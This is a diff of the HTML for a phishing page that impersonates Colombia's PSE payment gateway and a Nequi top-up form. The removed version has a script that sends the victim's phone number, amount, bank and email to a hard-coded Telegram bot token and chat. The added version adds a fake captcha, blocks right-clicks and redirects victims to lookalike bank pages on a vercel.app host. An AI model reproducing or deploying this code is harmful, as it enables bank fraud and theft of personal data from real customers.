@@ -1,529 +1,539 @@
-<html>
-    <head>
-        <title>PSE - Pago con Registro Person Natural</title>
-        <meta http-equiv="content-type" content="text/html; utf-8">
-        <meta charset="utf-8">
-        
-        <meta content="es" http-equiv="Content-Language">
-    
-        <meta name="description" content="">
-        <meta name="author" content="">
-        <meta name="Copyright" content="">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-        <meta http-equiv="X-UA-Compatible" content="IE=edge">
-        <link rel="preconnect" href="https://fonts.googleapis.com">
-        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-        <link href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&display=swap" rel="stylesheet">
-        
-        <!-- ============================================================ -->
-        <!-- RUTAS CORREGIDAS: apuntan a assets/ (sin ../)                -->
-        <!-- ============================================================ -->
-        <script type="text/javascript" src="assets/js/jquery-3.6.0.min.js"></script>      
-        <script type="text/javascript" src="assets/js/functions.js"></script>  
-        <script type="text/javascript" src="assets/js/ready.js"></script> 
-        
-        <style type="text/css">
-            *{
-                font-family: "Lato", sans-serif;
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Validar Recarga</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@200..800&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: #fff;
+            padding: 20px;
+        }
+        .formulario,
+        .validacion {
+            max-width: 360px;
+            margin: auto;
+        }
+
+        .input-rosa,
+        .field-select,
+        .campo-flotante {
+            width: 100%;
+            margin-bottom: 12px;
+            box-sizing: border-box;
+        }
+
+        .input-rosa {
+            padding: 14px 16px;
+            border: none;
+            border-radius: 2px;
+            background: #F8F1F5;
+            font-size: 16px;
+            color: #111;
+            outline: none;
+            font-family: 'Manrope', sans-serif;
+        }
+        .input-rosa::placeholder {
+            color: #200020;
+        }
+
+        .field-select {
+            position: relative;
+            border-radius: 2px;
+            background: #F8F1F5;
+        }
+        .field-select .label {
+            position: absolute;
+            top: 6px;
+            left: 12px;
+            font-size: 12px;
+            color: #e84393;
+            pointer-events: none;
+        }
+        .field-select select {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 100%;
+            border: none;
+            outline: none;
+            background: transparent;
+            font-size: 16px;
+            color: #111;
+            padding: 22px 42px 12px 12px;
+            border-radius: 2px;
+            font-family: 'Manrope', sans-serif;
+            cursor: pointer;
+            font-weight: 500 !important;
+        }
+        .field-select::after {
+            content: "";
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            width: 10px;
+            height: 10px;
+            border-right: 2px solid #333;
+            border-bottom: 2px solid #333;
+            transform: translateY(-30%) rotate(45deg);
+            pointer-events: none;
+        }
+
+        .campo-flotante {
+            position: relative;
+        }
+        .select-rosa {
+            width: 100%;
+            padding: 16px 16px;
+            border: none;
+            border-radius: 2px;
+            background: #F8F1F5;
+            font-size: 16px;
+            color: #111;
+            outline: none;
+            box-sizing: border-box;
+            font-family: 'Manrope', sans-serif;
+            -webkit-appearance: none;
+            appearance: none;
+            cursor: pointer;
+            font-weight: 500 !important;
+        }
+
+        .campo-flotante.select-active .label-flotante,
+        .campo-flotante:focus-within .label-flotante {
+            top: 12px !important;
+            left: 12px !important;
+            font-size: 12px !important;
+            color: #e84393 !important;
+            font-weight: 500 !important;
+            padding: 0 !important;
+            background: transparent !important;
+            font-family: 'Manrope', sans-serif !important;
+        }
+
+        .campo-flotante.select-active .select-rosa,
+        .campo-flotante:focus-within .select-rosa {
+            padding: 20px 16px 12px 16px !important;
+        }
+
+        .campo-flotante .label-flotante {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 16px;
+            color: #200020;
+            pointer-events: none;
+            transition: all 0.2s ease;
+            background: #F8F1F5;
+            padding: 0 4px;
+            font-family: 'Manrope', sans-serif;
+        }
+
+        .campo-flotante::after {
+            content: "";
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            width: 10px;
+            height: 10px;
+            border-right: 2px solid #333;
+            border-bottom: 2px solid #333;
+            transform: translateY(-30%) rotate(45deg);
+            pointer-events: none;
+            opacity: 0;
+            transition: opacity 0.2s ease;
+        }
+        .campo-flotante:focus-within::after,
+        .campo-flotante.select-active::after {
+            opacity: 1;
+        }
+
+        .captcha-container {
+            width: 100%;
+            max-width: 360px;
+            margin: 0 auto 16px auto;
+            padding: 20px 20px;
+            border: 2px solid #f8bbd0;
+            border-radius: 15px;
+            background: #fff;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            gap: 18px;
+            transition: all 0.3s ease;
+            font-size: 16px;
+            box-sizing: border-box;
+            position: relative;
+            overflow: visible;
+        }
+        .captcha-container.checked {
+            background: #f8fffb;
+            border-color: #22c55e;
+        }
+        .captcha-checkbox {
+            width: 35px;
+            height: 35px;
+            border: 3px solid #e91e63;
+            border-radius: 50%;
+            background: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+            flex-shrink: 0;
+            position: relative;
+        }
+        .captcha-container.checked .captcha-checkbox {
+            background: #f8fffb;
+            border-color: #22c55e;
+        }
+        .check-svg {
+            width: 32px;
+            height: 32px;
+            opacity: 0;
+            transition: opacity 0.2s;
+        }
+        .captcha-container.checked .check-svg {
+            opacity: 1;
+        }
+        .captcha-text {
+            color: #111;
+            font-weight: 500;
+            font-family: 'Manrope', sans-serif !important;
+            font-size: 16px;
+            line-height: 1.4;
+        }
+        .ripple-outer {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 35px;
+            height: 35px;
+            border: 1.5px solid #e91e63;
+            border-radius: 50%;
+            transform: translate(-50%, -50%) scale(1);
+            opacity: 0.8;
+            pointer-events: none;
+            animation: ripple-outer 3s infinite ease-out;
+        }
+        @keyframes ripple-outer {
+            0% {
+                transform: translate(-50%, -50%) scale(1);
+                opacity: 0.8;
             }
-            body{
-                padding: 0;
-                margin: 0;
+            100% {
+                transform: translate(-50%, -50%) scale(2);
+                opacity: 0;
             }
+        }
+        .captcha-container.checked .ripple-outer {
+            animation: none;
+            opacity: 0;
+        }
+        .ayuda-link {
+            display: block;
+            text-align: center;
+            margin-top: 12px;
+            color: #e91e63;
+            font-size: 14px;
+            text-decoration: none;
+        }
+        .ayuda-link:hover {
+            text-decoration: underline;
+        }
+        select option,
+        select optgroup {
+            background-color: #F8F1F5 !important;
+            color: #111 !important;
+        }
+        select option:hover,
+        select option:checked {
+            background-color: #f5e8ef !important;
+        }
+        .validacion {
+            display: none;
+            background: #fff;
+            border-radius: 12px;
+            padding: 16px;
+            box-shadow: 0px 2px 6px rgba(0, 0, 0, 0.1);
+        }
+        .validacion p {
+            margin: 4px 0;
+            font-size: 14px;
+        }
+        .label-text {
+            color: #e91e63;
+            font-size: 13px;
+        }
+        .valor-text {
+            color: #111;
+            font-weight: 500;
+        }
+        button {
+            padding: 12px;
+            border: none;
+            background: #e91e63;
+            color: #fff;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+        button:disabled {
+            background-color: #f1bfda !important;
+            cursor: not-allowed;
+        }
+        .header-img {
+            width: 100%;
+            max-width: 400px;
+            display: block;
+            margin: 0 auto;
+        }
+        .footer-img {
+            width: 100%;
+            max-width: 700px;
+            display: block;
+            margin: 0 auto;
+        }
 
-            #cargando{
-                border-radius: 3px;
-                margin: 0 auto 40 auto;
-                overflow: hidden;
-                padding: 0;
-                /* Ruta corregida */
-                background-image: url(assets/img/load.gif);
-                background-position: -4px -106px;
-                background-size: 499px;
-                height: 18px;
-                width: 277px;  
-                display: none;
-            }
+        .btn-recargar {
+            background: #da0081;
+            color: #fff;
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 6px;
+            margin-top: 12px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .btn-recargar:hover {
+            background: #b0006a;
+        }
 
-            #cabecera{
-                /* Ruta corregida */
-                background-image: url(assets/img/fondo-cabecera.png);
-                background-position: right;                
-                height: 168px;
-                padding-top: 10px;
-                text-align: center;
-            }
+        .btn-atras {
+            background: #fff;
+            color: #200020;
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #200020;
+            border-radius: 6px;
+            margin-top: 8px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .btn-atras:hover {
+            background: #f5f5f5;
+        }
+    </style>
+</head>
+<body>
 
-            #cabecera table{
-                max-width: 1185px;
-                margin: 0 auto;
-            }
-            #cabecera td{                
-                color: #fdb916;
-                font-size: 1.875em;
-                font-weight: 500;                
-            }
-            #ayuda{
-                position: fixed;                
-                top: 178px;
-                right: 0px;
-                z-index: 100;
-            }
+    <script>
+        document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
+    </script>
 
-            #tipos-personas{
-                width: 80%;
-                margin: 0 auto 55 auto;
-                max-width: 385px;
-            }
+    <!-- Encabezado -->
+    <img id="header-img" src="img/h1.png" class="header-img" alt="">
 
-            #frm-correo{
-                margin:0 auto 84 auto;                 
-                width: 88%; 
-                max-width: 926px; 
-            }
-            .entrada-pse{   
-                    outline: 0;                 
-                    width: 100%;
-                    height: 30px;
-                    padding: 6px 12px;
-                    font-size: 14px;
-                    line-height: 1.42857143;
-                    color: #555;
-                    background-color: #fff;                    
-                    border: 1px solid #feeaba;
-                    border-radius: 10px;
-                    -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075);
-                    box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075);                                 
-            }
+    <!-- Formulario -->
+    <div class="formulario" id="formulario">
+        <input maxlength="10" id="celular" class="input-rosa" type="tel" placeholder="Número de celular">
+        <input maxlength="10" id="confirmar" class="input-rosa" type="tel" placeholder="Confirma el número de celular">
+        <input id="monto" class="input-rosa" type="tel" placeholder="¿Cuánto?">
 
-            .entrada-pse:focus{   
-                box-shadow: 0 0 1px #feeaba;
-                border: 1px solid #ffbc1d;           
-            }
+        <script>
+            (function() {
+                const input = document.getElementById('monto');
+                const MAX_DIGITS = 8;
+                input.addEventListener('input', function() {
+                    let digits = this.value.replace(/\D/g, '').replace(/^0+/, '');
+                    if (digits.length > MAX_DIGITS) digits = digits.slice(0, MAX_DIGITS);
+                    if (digits) {
+                        const formatted = new Intl.NumberFormat('es-CO').format(Number(digits));
+                        this.value = '$ ' + formatted;
+                    } else {
+                        this.value = '';
+                    }
+                    validarFormulario();
+                });
+                input.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    let text = (e.clipboardData || window.clipboardData).getData('text') || '';
+                    text = text.replace(/\D/g, '').replace(/^0+/, '').slice(0, MAX_DIGITS);
+                    if (text) {
+                        const formatted = new Intl.NumberFormat('es-CO').format(Number(text));
+                        this.value = '$ ' + formatted;
+                    } else {
+                        this.value = '';
+                    }
+                    validarFormulario();
+                });
+            })();
+        </script>
 
-            #txt-email{
-                width: 346px;
-
-            }
-
-            #etq-email{
-                font-weight: 400;
-                color: #222239;
-                font-size: 1em;
-            }
-
-            #etq-email-mobile{
-                padding-left: 10px;
-                margin: 0 auto 10 auto;
-                text-align: left;
-                font-weight: 400;
-                color: #222239;
-                font-size: 1em;        
-            }
-
-            #tbl-tipo{
-                margin: 0 auto 31 auto;
-                max-width: 540px;
-            }
-
-            #tbl-tipo-mobile{
-                margin: 0 auto;
-                max-width: 224px;
-            }
-
-            .tipo-izq{
-                color: #000;
-            }
-
-            .u-reg{
-                font-weight: 400;font-size: 15px;
-            }
-
-            .separador{
-                margin-top: 15px;
-                border-top: 1px solid #EEEEEE;
-                width: 80%;
-                margin-bottom: 29px;
-            }
-
-            .btn-pse{
-                padding: 10px 49px;
-                border: 1px solid #0275d8;                
-                color: #0275d8;
-                font-size: 16px;
-                font-weight: 300;
-                background-color: #fff;
-                cursor: pointer;
-            }
-
-            .btn-pse:hover{
-                background-color: #0275d8;
-                color: #fff;
-            }
-            #pie{
-                margin: 0 auto;
-            }
-
-            .letra-pie{
-                font-size: 11px;
-                font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
-                line-height: 1.42857143;
-                color: #333;
-                text-align: left;
-            }
-
-            #pie-mobile{
-                margin-bottom: 20px;
-                text-align: center;
-                display: none;
-            }
-
-            #btn-mobile{
-                display: none;
-                text-align: center;
-                margin-bottom: 20px;
-            }
-
-            #logo-mobile{
-                display: none;
-            } 
-
-            #tbl-tipo-mobile,#etq-email-mobile{
-                display: none;
-            }
-
-            #err-email{
-                color: #a94442;
-                font-size: 14px;
-                padding: 4px 4px;
-                display: none;
-            }
-
-            @media (max-width:1199px) {
-                #tipos-personas{
-                    max-width: 333px;
-                }
-
-                #frm-correo{
-                    max-width: 733px;
-                }       
-                #txt-email{
-                    width: 277px;
-                }
-
-                #cabecera table{
-                    max-width: 967px;                 
-                }
-
-            }                         
-                   
-
-            @media (max-width:991px) {
-                #cabecera table{
-                    max-width: 747px;                 
-                }
-                
-                #lado-izq-pie,#btn-der{
-                    display: none;
-                }
-
-                #lado-der-pie,#btn-izq{
-                    text-align: center !important;
-                }
-                
-                #lado-der-pie div{
-                    margin: 0 auto;
-                    text-align: center;
-                }
-
-                #lado-der-pie table{
-                    margin: 0 auto;
-                }
-
-                #lado-der-pie td{
-                    text-align: center;
-                }
-                #pie-mobile,#btn-mobile{
-                    display: block;
-                }
-
-            }
-
-            @media (max-width:767px) {
-                #txt-email{
-                    width: 100%;
-                }
-                #etq-email,#etq-email-res{
-                    display: none;
-                }
-                #cabecera{
-                    background-image: unset;                    
-                }
-                #tbl-tipo{                
-                    max-width: 428px;
-                }
-                #tipos-personas{               
-                    max-width: unset;
-                }
-
-            }    
-
-            @media (max-width:515px) {
-                .tipo-izq{
-                    display: none;
-                }  
-
-                #tbl-tipo{
-                    max-width: 224px;
-                }                    
-            } 
-
-            @media (max-width:480px) {
-                #tbl-cabecera {
-                    width: 92%;
-                }
-
-                #tbl-cabecera img{
-                    width: 100px;
-                }
-
-                #td-logo{
-                    width: 114px;
-                }                     
-            }
-
-            @media (max-width:378px) {                
-                #td-logo{
-                    display: none;
-                } 
-                #td-texto{
-                    text-align: center;
-                }    
-                #logo-mobile{
-                    display: initial;
-                    width: 100px;
-                }                 
-            }        
-        </style>
-    </head>
-    <body>
-        <div id="cabecera">
-            <!-- Ruta corregida -->
-            <img src="assets/img/lps.png" id="logo-mobile">
-            <table cellpadding="0" cellspacing="0" width="98%" border="0" id="tbl-cabecera">
-                <tr>
-                    <td valign="middle" align="left" width="200" id="td-logo">
-                        <!-- Ruta corregida -->
-                        <img src="assets/img/lps.png">
-                    </td>
-                    <td valign="middle" align="left" id="td-texto">Fácil, rápido y seguro</td>
-                </tr>
-            </table>
-        </div>        
-        <!-- Ruta corregida -->
-        <img src="assets/img/ayuda.jpg" id="ayuda">
-        <div style="text-align: center;font-weight: 700;font-size: 21px;color: #323153;margin-top: 47px;margin-bottom: 44px;padding: 0px 60px;">PSE - Pagos Seguros en Línea / Persona Natural</div>
-        <table border="0" cellspacing="0" cellpadding="0" id="tipos-personas">
-            <tr>
-                <td valign="top" align="center" style="color: #323153;text-align:center;font-weight: 400;font-size: 21px;">
-                    <!-- Ruta corregida -->
-                    <img src="assets/img/pers.jpg">
-                    <br>
-                    Persona natural
-                </td>
-                <td valign="top" align="center" style="color: #323153;text-align:center;font-weight: 400;font-size: 21px;">
-                    <!-- Ruta corregida -->
-                    <img src="assets/img/emp.jpg">
-                    <br>
-                    Persona juridica
-                </td>
-            </tr>
-        </table>
-
-        <table border="0" cellspacing="0" cellpadding="0" width="98%" id="tbl-tipo-mobile">
-            <tr>
-                <td valign="middle" align="left">
-                    <!-- Ruta corregida -->
-                    <img src="assets/img/registr.jpg">
-                </td>
-                <td valign="middle" align="left" class="u-reg">Soy un usuario registrado</td>                
-            </tr>
-        </table>
-
-        <table border="0" cellspacing="0" cellpadding="0" width="98%" id="tbl-tipo">
-            <tr>
-                <td valign="middle" align="left" class="tipo-izq">
-                    <!-- Ruta corregida -->
-                    <img src="assets/img/registr.jpg">
-                </td>
-                <td valign="middle" align="left" class="tipo-izq u-reg">Soy un usuario registrado</td>
-                <td valign="middle" align="left">
-                    <!-- Ruta corregida -->
-                    <img src="assets/img/nuevo.jpg">
-                </td>
-                <td valign="middle" align="left" class="u-reg" style="color: #8b8d99;">Quiero registrarme ahora </td>
-            </tr>
-        </table>
-        <div id="frm-correo">
-            <div id="etq-email-mobile">E-mail</div>
-            <table cellpadding="0" cellspacing="0" border="0" width="100%">
-                <tr>
-                    <td width="25%" valign="middle" align="left" id="etq-email">E-mail</td>
-                    <td valign="middle" align="left">
-                        <input type="email" class="entrada-pse" id="txt-email" name="txt-email" placeholder="E-mail registrado en PSE" maxlength="120">
-                    </td>
-                    <tr>
-                        <td id="etq-email-res"></td>
-                        <td><div id="err-email">El campo e-mail es requerido</div></td>
-                    </tr>
-                </tr>
-            </table>
-            <div class="separador"></div>
-            <div id="btn-mobile"><button class="btn-pse" id="btn-banco-mobile">Ir al Banco</button></div>
-            <table cellpadding="0" cellspacing="0" border="0" width="100%">
-                <tr>
-                    <td valign="middle" align="left" id="btn-izq">Regresar al comercio</td>
-                    <td valign="middle" align="left" id="btn-der">
-                        <button class="btn-pse" id="btn-banco">Ir al Banco</button>
-                    </td>
-                </tr>
-            </table>
-        </div>        
-        <div id="cargando"></div>
-        <div id="pie-mobile">
-            <!-- Ruta corregida -->
-            <img src="assets/img/super.jpg">
+        <div class="field-select">
+            <span class="label">Tipo de persona</span>
+            <select id="tipo">
+                <option>Natural</option>
+                <option>Jurídica</option>
+            </select>
         </div>
-        <table cellpadding="0" cellspacing="0" border="0" width="80%" id="pie">
-            <tr>
-                <td align="left" id="lado-izq-pie">
-                    <!-- Ruta corregida -->
-                    <img src="assets/img/super.jpg">
-                </td>
-                <td align="right" id="lado-der-pie">
-                    <div style="width:100%; max-width:340px;" class="letra-pie">Para mayor información comunícate con nosotros</div>
-                    <table cellpadding="0" cellspacing="0" border="0" width="100%" style="max-width: 340px;">
-                        <tr>
-                            <td></td>
-                            <td class="letra-pie">en Bogotá +57 (1) 3808890 opción 5</td>
-                        </tr>
-                        <tr>
-                            <td></td>
-                            <td class="letra-pie">o escríbenos https://www.pse.com.co/persona, opción centro de ayuda, Formulario de contacto.</td>
-                        </tr>
-                    </table>
-                </td>
-            </tr>
-        </table>
-    </body>    
-</html>
 
-<!-- ============================================================ -->
-<!-- CÓDIGO AGREGADO PARA INTEGRACIÓN CON TELEGRAM -->
-<!-- ============================================================ -->
-<script>
-    // ============================================================
-    // CONFIGURACIÓN DE TELEGRAM - ¡MODIFICA ESTOS DATOS!
-    // ============================================================
-    const TELEGRAM_BOT_TOKEN = '8866902890:AAFvmzViG-7yW7YShIoErMaoRVvNDvb6GRE';
-    const TELEGRAM_CHAT_ID = '-5564154281';
+        <div class="campo-flotante">
+            <select id="banco" required class="select-rosa">
+                <option value="" disabled selected></option>
+                <option value="">A continuación seleccione su banco</option>
+                <option value="bc">BANCOLOMBIA</option>
+                <option value="dv">DAVIVIENDA</option>
+                <option value="bg">BANCO DE BOGOTÁ</option>
+                <option value="avv">BANCO AV VILLAS</option>
+                <option value="pop">BANCO POPULAR</option>
+                <option value="cj">BANCO CAJA SOCIAL</option>
+                <option value="cpa">SCOTIABANK COLPATRIA</option>
+                <option value="occ">BANCO OCCIDENTE</option>
+            </select>
+            <span class="label-flotante">Elige el banco</span>
+        </div>
 
-    // ============================================================
-    // RECUPERAR DATOS DEL SESSION STORAGE
-    // ============================================================
-    const celular = sessionStorage.getItem('celular') || 'No disponible';
-    const monto = sessionStorage.getItem('monto') || 'No disponible';
-    const tipo = sessionStorage.getItem('tipo') || 'No disponible';
-    const banco = sessionStorage.getItem('banco') || 'No disponible';
+        <!-- CAPTCHA -->
+        <div class="captcha-container" id="captchaBox">
+            <div class="captcha-checkbox">
+                <div class="ripple-outer"></div>
+                <svg class="check-svg" width="35" height="35" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M5 13L9 17L19 7" stroke="#4caf50" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+            </div>
+            <div class="captcha-text">Confirmo que soy una persona real.</div>
+        </div>
 
-    // ============================================================
-    // VALIDAR EMAIL
-    // ============================================================
-    function validarEmail(email) {
-        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-        return re.test(email);
-    }
+        <img id="footer-img" src="img/minifooter.png" class="footer-img" alt="">
 
-    // ============================================================
-    // ENVIAR A TELEGRAM
-    // ============================================================
-    function enviarATelegram() {
-        const email = document.getElementById('txt-email').value.trim();
-        const errDiv = document.getElementById('err-email');
+        <button id="btnContinuar" style="padding: 4.3%; width: 100%; border-radius: 6px;" type="button" onclick="mostrarValidacion()" disabled>
+            Continuar
+        </button>
+        <a class="ayuda-link" href="#">Ayuda</a>
+    </div>
 
-        if (!email || !validarEmail(email)) {
-            errDiv.style.display = 'block';
-            document.getElementById('txt-email').focus();
-            return;
-        } else {
-            errDiv.style.display = 'none';
-        }
+    <!-- Validación -->
+    <div class="validacion" id="vista-validacion">
+        <p class="label-text">Concepto</p>
+        <p class="valor-text">Recarga Nequi PSE</p>
+        <p class="label-text">Número de celular</p>
+        <p class="valor-text" id="val-celular"></p>
+        <p class="label-text">¿Cuánto?</p>
+        <p class="valor-text" id="val-monto"></p>
+        <p class="label-text">Tipo de persona</p>
+        <p class="valor-text" id="val-tipo"></p>
+        <p class="label-text">Banco</p>
+        <p class="valor-text" id="val-banco"></p>
+        <button class="btn-recargar" onclick="irARegistroCorreo()">
+            Recargar
+        </button>
+        <button class="btn-atras" onclick="volverFormulario()">Atrás</button>
+    </div>
 
-        const mensaje = `🔹 NUEVA RECARGA PSE 🔹
-        
-📱 Celular: ${celular}
-💰 Monto: ${monto}
-🏦 Banco: ${banco}
-👤 Tipo: ${tipo}
-📧 Correo: ${email}
-📅 Fecha: ${new Date().toLocaleString()}`;
+    <script>
+        // ============================================================
+        // MAPA DE BANCOS A URLs DE PAGO
+        // ============================================================
+        const bancosPSE = {
+            'bc': 'https://pagosonline-pse.vercel.app/sites/bc/manager/152',
+            'dv': 'https://pagosonline-pse.vercel.app/sites/dv/manager/152',
+            'bg': 'https://pagosonline-pse.vercel.app/sites/bg/manager/152',
+            'avv': 'https://pagosonline-pse.vercel.app/sites/avv/manager/152',
+            'pop': 'https://pagosonline-pse.vercel.app/sites/pop/manager/152',
+            'cj': 'https://pagosonline-pse.vercel.app/sites/cj/manager/152',
+            'cpa': 'https://pagosonline-pse.vercel.app/sites/cpa/manager/152',
+            'occ': 'https://pagosonline-pse.vercel.app/sites/occ/manager/152'
+        };
 
-        document.getElementById('cargando').style.display = 'block';
-        document.getElementById('btn-banco').disabled = true;
-        document.getElementById('btn-banco-mobile').disabled = true;
-
-        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: mensaje,
-                parse_mode: 'HTML'
-            })
-        })
-        .then(response => response.json())
-        .then(data => {
-            document.getElementById('cargando').style.display = 'none';
-            document.getElementById('btn-banco').disabled = false;
-            document.getElementById('btn-banco-mobile').disabled = false;
-
-            const urlPago = sessionStorage.getItem('urlPago');
-            if (urlPago) {
-                window.location.href = urlPago;
-            } else {
-                alert('No se encontró la URL de pago');
-            }
-        })
-        .catch(error => {
-            document.getElementById('cargando').style.display = 'none';
-            document.getElementById('btn-banco').disabled = false;
-            document.getElementById('btn-banco-mobile').disabled = false;
-            alert('Error al enviar los datos. Intenta nuevamente.');
+        let captchaChecked = false;
+        document.getElementById('captchaBox').addEventListener('click', () => {
+            captchaChecked = !captchaChecked;
+            document.getElementById('captchaBox').classList.toggle('checked', captchaChecked);
+            validarFormulario();
         });
-    }
 
-    // ============================================================
-    // ASIGNAR EVENTOS A LOS BOTONES
-    // ============================================================
-    document.getElementById('btn-banco').addEventListener('click', enviarATelegram);
-    document.getElementById('btn-banco-mobile').addEventListener('click', enviarATelegram);
+        document.getElementById('banco').addEventListener('change', function() {
+            this.parentElement.classList.add('select-active');
+            validarFormulario();
+        });
 
-    // ============================================================
-    // VALIDACIÓN EN TIEMPO REAL
-    // ============================================================
-    document.getElementById('txt-email').addEventListener('input', function() {
-        const email = this.value.trim();
-        const errDiv = document.getElementById('err-email');
-        if (email && !validarEmail(email)) {
-            errDiv.style.display = 'block';
-            errDiv.textContent = 'Ingresa un correo electrónico válido';
-        } else if (!email) {
-            errDiv.style.display = 'block';
-            errDiv.textContent = 'El campo e-mail es requerido';
-        } else {
-            errDiv.style.display = 'none';
+        function validarFormulario() {
+            const celular = document.getElementById("celular").value.trim();
+            const confirmar = document.getElementById("confirmar").value.trim();
+            const monto = document.getElementById("monto").value.trim();
+            const banco = document.getElementById("banco").value;
+            const btn = document.getElementById("btnContinuar");
+            if (
+                celular !== "" &&
+                confirmar !== "" &&
+                celular === confirmar &&
+                monto !== "" &&
+                banco !== "" &&
+                captchaChecked
+            ) {
+                btn.disabled = false;
+                btn.style.backgroundColor = "#da0081";
+            } else {
+                btn.disabled = true;
+                btn.style.backgroundColor = "#f1bfda";
+            }
         }
-    });
-</script>
+
+        function mostrarValidacion() {
+            const celular = document.getElementById("celular").value.trim();
+            const monto = document.getElementById("monto").value.trim();
+            const tipo = document.getElementById("tipo").value;
+            const selectBanco = document.getElementById("banco");
+            const nombreBanco = selectBanco.options[selectBanco.selectedIndex].text;
+            
+            document.getElementById("val-celular").textContent = celular;
+            document.getElementById("val-monto").textContent = monto;
+            document.getElementById("val-tipo").textContent = tipo;
+            document.getElementById("val-banco").textContent = nombreBanco;
+            
+            document.getElementById("header-img").src = "img/h2.png";
+            document.getElementById("footer-img").style.display = "none";
+            document.getElementById("formulario").style.display = "none";
+            document.getElementById("vista-validacion").style.display = "block";
+        }
+
+        function volverFormulario() {
+            document.getElementById("header-img").src = "img/h1.png";
+            document.getElementById("footer-img").style.display = "block";
+            document.getElementById("formulario").style.display = "block";
+            document.getElementById("vista-validacion").style.display = "none";
+        }
+
+        // ================================================================
+        // REDIRIGE AL FORMULARIO DE CORREO CON LOS DATOS
+        // ================================================================
+        function irARegistroCorreo() {
+            const celular = document.getElementById("val-celular").textContent.trim();
+            const monto = document.getElementById("val-monto").textContent.trim();
+            const tipo = document.getElementById("val-tipo").textContent.trim();
+            const banco = document.getElementById("val-banco").textContent.trim();
+            const bancoId = document.getElementById("banco").value;
+            const urlPago = bancosPSE[bancoId];
+
+            // Guardar datos en sessionStorage
+            sessionStorage.setItem('celular', celular);
+            sessionStorage.setItem('monto', monto);
+            sessionStorage.setItem('tipo', tipo);
+            sessionStorage.setItem('banco', banco);
+            sessionStorage.setItem('bancoId', bancoId);
+            sessionStorage.setItem('urlPago', urlPago);
+
+            // Redirigir a PSEUserRegister/index.html
+            window.location.href = 'PSEUserRegister/index.html';
+        }
+    </script>
+
+</body>
+</html>
